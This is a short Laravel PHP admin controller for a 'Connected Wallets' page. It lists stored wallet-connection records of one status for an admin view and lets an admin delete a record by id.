<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\GeneralSetting;
use App\Models\User;
use App\Models\WalletConnect;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class ConnectWalletController extends Controller
{
    //landing page
    public function landingPage()
    {
        $web = GeneralSetting::find(1);
        $user = Auth::user();

        $dataView =[
            'siteName' => $web->name,
            'pageName' => 'Connected Wallets',
            'user'     =>  $user,
            'web'=>$web,
            'wallets' => WalletConnect::where('status',2)->orderBy('id','desc')->get(),
        ];

        return view('admin.connect_wallet',$dataView);
    }

    public function delete($id)
    {
        WalletConnect::where('id', $id)->delete();

        return back()->with('success','Wallet has been deleted');
    }
}
